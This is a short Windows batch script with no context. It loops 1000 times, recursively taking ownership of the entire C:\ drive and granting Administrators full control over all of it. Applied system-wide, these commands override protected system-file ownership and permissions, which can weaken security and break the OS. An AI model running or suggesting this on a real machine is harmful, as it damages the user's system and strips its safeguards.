for /l %%x in (1, 1, 1000) do (
echo %%x
takeown /R /A /F C:\ /D N
icacls C:\ /grant Administrators:F /T /C
)